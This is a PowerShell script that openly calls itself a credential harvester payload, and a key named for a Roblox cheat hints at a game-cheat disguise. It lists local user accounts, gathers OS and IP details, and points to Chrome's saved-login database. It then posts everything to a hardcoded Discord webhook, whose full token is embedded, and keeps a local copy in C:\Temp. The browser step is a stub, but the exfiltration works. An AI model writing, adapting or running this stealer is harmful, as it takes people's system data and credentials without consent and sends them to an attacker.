# ==================================================================
# --- 1. CONFIGURATION SECTION (EDIT THESE VALUES maibe baybe) ---
# ======================================================

# Your provided Discord Webhook URL
$WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"

# !!! CRITICAL: This passphrase must be extremely complex and unique !!!
$SecretKey = "MyRobloxCheatKey_VerySecretAndLongEnough123!"

# ========================================================
# --- 2. CORE HARVESTING FUNCTIONS ---
# ======================================================

Function Get-LocalUserCredentials {
    Write-Host "[+] Harvesting Local User Credentials (net user)..." -ForegroundColor Cyan
    try {
        $Output = net user | Select-String -Pattern "User account name.*.*"

        $Creds = @()
        $Output | ForEach-Object {
            $Username = $_.ToString().Split(':')[0].Trim()
            $Creds += [PSCustomObject]@{
                Username = $Username;
                Status = "Local Account Check";
                Instructions = "Need manual dump/WMI query to get actual password hash."
            }
        }
        return $Creds
    } catch {
        Write-Warning "Error gathering local users: $($_.Exception.Message)"
        return [PSCustomObject]@{Error = "Failed to check local users."}
    }
}

Function Get-SystemInfo {
    Write-Host "[+] Harvesting Core System Information..." -ForegroundColor Cyan
    try {
        # FIX APPLIED: Using simple Select-String match instead of UsedPattern
        $OSInfo = systeminfo | Select-String -Pattern "OS Name" -SimpleMatch;
        $Network = ipconfig /all | Select-String -Pattern "IPv4 Address" -SimpleMatch;

        # Return a single object containing all findings
        return [PSCustomObject]@{
            OS = if ($OSInfo) {$OSInfo.ToString().Trim()} else {"N/A"};
            NetworkIP = if ($Network) {$Network.ToString().Trim()} else {"N/A"}
        }
    } catch {
        Write-Warning "Error gathering system info: $($_.Exception.Message)"
        return [PSCustomObject]@{OS = "Error"; NetworkIP = "Error"}
    }
}

Function Get-BrowserCredentialDump {
    Write-Host "[+] Attempting simulated Browser Credential Dump..." -ForegroundColor Cyan
    $DummyData = "Simulation: Look for stored credentials in the following paths: $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    return [PSCustomObject]@{
        Simulation_Notes = $DummyData;
        Instructions = "Requires specialized module to parse SQLite DB."
    }
}

# =========================================================
# --- 3. WEBHOOK TRANSMISSION LOGIC (SIMPLIFIED FOR ROBUSTNESS) ---
# =================================================================
Function Send-WebhookReport {
    param(
        [Parameter(Mandatory=$true)]
        [psobject]$AllData # <-- Updated to accept the object directly
    )
    Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta

    # --- FIX APPLIED: Minimal structure to satisfy Discord API requirements (No more complex array fields) ---
    $Body = @{
        content = "✅ Credentials Harvest Complete. System diagnostics attached."
        embeds = @{
            title = "SYSTEM_HARVEST_REPORT_V1.0"
            description = "System snapshots collected via PowerShell. Review the details below."
            color = 16776960 
            fields = @(
                [PSObject]@{Name = "System OS Info"; Value = $AllData.SystemInfo.OS | Out-String},
                [PSObject]@{Name = "Network Context"; Value = $AllData.NetworkIP | Out-String},
                [PSObject]@{Name = "Local User Credentials"; Value = $AllData.LocalCreds | Out-String},
                [PSObject]@{Name = "Browser/Vault Status"; Value = $AllData.BrowserVault | Out-String}
            )
        }
    } | ConvertTo-Json

    try {
        Write-Host "[DEBUG] Sending Payload: $($Body.Substring(0, [System.Math]::Min(100, $Body.Length))) ..."
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
        Write-Host "[+] SUCCESS: Data successfully pushed to Discord." -ForegroundColor Green
    } catch {
        Write-Error "CRITICAL ERROR: Webhook failure. $($_.Exception.Message)"
    }
}

# =================================================================
# --- 4. MASTER EXECUTION FLOW (FINALIZED) ---
# =================================================================

Write-Host "==========================================================================" -ForegroundColor White
Write-Host "================= STARTER: RUNNING CREDENTIAL HARVESTER PAYLOAD ==================" -ForegroundColor White
Write-Host "====================================================================" -ForegroundColor White

# 1. Collect All Data Points
$UserCreds = Get-LocalUserCredentials
$SysInfo = Get-SystemInfo
$BrowserData = Get-BrowserCredentialDump

# 2. Aggregate All Data into ONE Object
$FinalReport = [PSCustomObject]@{
    SystemInfo = $SysInfo;
    NetworkIP = $SysInfo.NetworkIP;
    LocalCreds = $UserCreds;
    BrowserVault = $BrowserData
}

# 3. Transmit (Primary Goal)
Send-WebhookReport -AllData $FinalReport

# 4. Local Fallback (Secondary Goal - Resilience)
$TempPath = "C:\Temp"
$OutputFile = Join-Path $TempPath "CredentialHarvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

# *** FIX APPLIED: Pre-checking directory existence ***
try {
    if (-not (Test-Path $TempPath)) {
        New-Item -Path $TempPath -ItemType Directory | Out-Null
        Write-Host "[*] Successfully created missing directory: $TempPath" -ForegroundColor Yellow
    }

    # Attempt to output the full object to the file
    $FinalReport | Out-File -FilePath $OutputFile -Encoding UTF8
    Write-Host "[+] OFFLINE: Full detailed report saved to: $OutputFile" -ForegroundColor Yellow

} catch {
    Write-Error "Failed to write local file report. $($_.Exception.Message)"
}

Write-Host ""
Write-Host "================================================================================" -ForegroundColor White
Write-Host "================= END OF PAYLOAD EXECUTION ======================" -ForegroundColor White
